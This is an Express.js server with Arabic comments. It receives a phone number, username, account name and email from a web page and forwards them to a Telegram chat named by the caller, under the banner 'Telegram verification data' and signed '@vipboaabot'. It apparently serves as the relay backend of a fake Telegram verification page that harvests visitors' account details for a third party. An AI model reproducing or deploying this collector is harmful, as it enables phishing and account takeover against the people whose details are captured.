const express = require('express');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config(); // إضافة هذه السطر لتحميل متغيرات البيئة

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware لتحليل البيانات الواردة
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());

// نقطة النهاية لاستقبال البيانات من الموقع وإرسالها للبوت
app.post('/forward-to-bot', async (req, res) => {
  try {
    const { phone, username, accountName, email, chatId } = req.body;
    
    if (!phone || !accountName || !email || !chatId) {
      return res.status(400).json({ 
        success: false, 
        message: 'الحقول المطلوبة: phone, accountName, email, chatId' 
      });
    }

    // جلب توكن البوت من متغيرات البيئة
    const botToken = process.env.BOT_TOKEN;
    
    // التحقق من وجود التوكن
    if (!botToken) {
      return res.status(500).json({ 
        success: false, 
        message: 'توكن البوت غير مضبوط في البيئة' 
      });
    }
    
    // نص الرسالة
    const message = `🔹 - بيانات توثيق تيليجرام:\n\n📞 - رقم الهاتف: ${phone}\n👤 - يوزر الحساب: ${username || 'غير محدد'}\n🏷️ - اسم الحساب: ${accountName}\n📧 - البريد الإلكتروني: ${email}\n\n👑 - تم الإرسال بواسطة - @vipboaabot`;
    
    // إرسال الرسالة إلى البوت
    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message
    });

    res.json({ 
      success: true, 
      message: 'تم إرسال البيانات إلى البوت بنجاح',
      telegramResponse: response.data 
    });
  } catch (error) {
    console.error('Error:', error.response?.data || error.message);
    res.status(500).json({ 
      success: false, 
      message: 'حدث خطأ أثناء إرسال البيانات إلى البوت',
      error: error.response?.data || error.message 
    });
  }
});

// نقطة نهاية للتحقق من أن السيرفر يعمل
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'السيرفر الوسيط يعمل بشكل صحيح',
    hasBotToken: !!process.env.BOT_TOKEN 
  });
});

// نقطة أساسية
app.get('/', (req, res) => {
  res.json({ message: 'مرحباً بك في سيرفر توثيق تيليجرام' });
});

// تشغيل السيرفر
app.listen(PORT, () => {
  console.log(`السيرفر الوسيط يعمل على PORT: ${PORT}`);
  console.log(`BOT_TOKEN: ${process.env.BOT_TOKEN ? 'مضبوط' : 'غير مضبوط'}`);
});